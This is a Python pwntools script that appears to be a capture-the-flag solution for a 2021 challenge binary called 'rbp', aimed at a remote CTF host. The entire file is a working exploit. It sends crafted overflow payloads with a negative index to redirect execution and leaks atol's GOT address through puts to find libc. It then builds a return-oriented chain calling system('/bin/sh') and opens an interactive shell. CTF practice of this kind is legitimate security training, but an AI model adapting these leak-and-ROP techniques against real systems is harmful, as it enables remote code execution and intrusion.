from pwn import *

debug = 0

if(debug):
	r = process("./rbp")
	gdb.attach(r)
	atol_off = 0x0000000000047750
	system_off = 0x0000000000055410
	binsh_off = 0x1b75aa
else:
	r = remote("pwn-2021.duc.tf", 31910)
	atol_off = 0x0000000000042210
	system_off = 0x000000000004fa60
	binsh_off = 0x1abf05

r.recvuntil(b'Hi there! What is your name?')

atol_got = 0x000000000404038
main = 0x4011d5
read_long = 0x4011a9
pop3_ret = 0x00000000004012af
pop2_ret = 0x00000000004012b0
printf = 0x401040
pop_rdi_ret = 0x00000000004012b3
pop5_ret = 0x00000000004012ab
pop_rbp_ret = 0x000000000040114d
ret = 0x000000000040101a
puts = 0x401030

# -------------- part1 ------------------

payload1 = b'aaaaaaaa' + p64(ret) + p64(main)
r.send(payload1)
r.recvuntil(b'Do you have a favourite number?')

payload2 = b"-80" + b"aaaaa" 
payload2 += p64(pop5_ret) 
#payload2 += b'bbb'
payload2 += p64(main)[:3]
r.send(payload2)


# -------------- part2 --------------------

payload1 = p64(pop_rdi_ret) + p64(atol_got) + p64(puts)
r.send(payload1)
r.recvuntil(b'Do you have a favourite number?')

payload2 = b"-40" + b"aaaaa" 
payload2 += p64(pop5_ret) 
payload2 += b'bbb'
#payload2 += p64(pop3_ret)[:3]
r.send(payload2)

stuff = r.recvuntil(b'Hi there! What is your name?').split(b'\nHi')[0][-6:]
stuff = int.from_bytes(stuff, "little")

libc_base = stuff - atol_off
print(hex(libc_base))

system_addr = libc_base + system_off
binsh_addr = libc_base + binsh_off

# -------------- part3 ------------------

payload1 = p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)
r.send(payload1)
r.recvuntil(b'Do you have a favourite number?')

payload2 = b"-40"
r.sendline(payload2)



r.interactive()

'''
# -------------- part3 --------------------

r.recvuntil(b'Hi there! What is your name?')
payload1 = p64(main) + b'aaaaaaaa' + b'bbbbbbbb' 
r.send(payload1) 
r.recvuntil(b'Do you have a favourite number?')

payload2 = b"-72" + b"aaaaa" 
payload2 += p64(main) 
payload2 += p64(pop3_ret)[:3]
r.send(payload2)
'''

